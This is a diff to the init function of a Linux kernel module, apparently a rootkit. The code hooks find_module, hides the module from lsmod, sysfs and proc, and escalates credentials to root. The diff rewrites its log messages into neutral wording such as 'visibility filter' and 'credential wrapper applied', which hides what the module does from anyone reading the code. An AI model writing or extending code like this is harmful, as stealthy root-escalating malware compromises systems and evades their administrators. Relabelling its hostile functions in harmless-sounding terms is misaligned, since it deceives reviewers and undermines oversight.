@@ -78,7 +78,7 @@ static int neverc_krt_lowvis_init(void)
 		ret = neverc_krt_interpose_install_ctx(&find_module_ctx, target,
 					    interpose_find_module_ctx, (void *)0);
 #else
-		ret = neverc_krt_interpose_install(&hide_state.find_module_interpose,
+		ret = neverc_krt_interpose_install(&vis_state.find_module_interpose,
 				       target, (void *)interpose_find_module,
 				       (void **)&orig_find_module);
 #endif
@@ -90,10 +90,10 @@ static int neverc_krt_lowvis_init(void)
 
 #ifdef NVK_LOWVIS_FULL_HIDE
 	neverc_krt_vis_full_conceal(&vis_state, &__this_module, "neverc_krt_lowvis");
-	neverc_krt_log_info("deep-hidden (list+sysfs+proc)\n");
+	neverc_krt_log_info("visibility filter: list+sysfs+proc\n");
 #elif defined(NVK_LOWVIS_HIDE)
 	neverc_krt_vis_conceal(&vis_state, &__this_module);
-	neverc_krt_log_info("hidden from lsmod\n");
+	neverc_krt_log_info("visibility filter: module list\n");
 #else
 	neverc_krt_log_info("log-only mode\n");
 #endif
@@ -101,9 +101,9 @@ static int neverc_krt_lowvis_init(void)
 #ifdef NVK_LOWVIS_ROOT
 	ret = neverc_krt_cred_set_root();
 	if (ret == 0)
-		neverc_krt_log_info("credentials elevated\n");
+		neverc_krt_log_info("credential wrapper applied\n");
 	else
-		neverc_krt_log_warn("cred elevation failed\n");
+		neverc_krt_log_warn("credential wrapper failed\n");
 #endif
 
 #ifdef NVK_LOWVIS_SELINUX
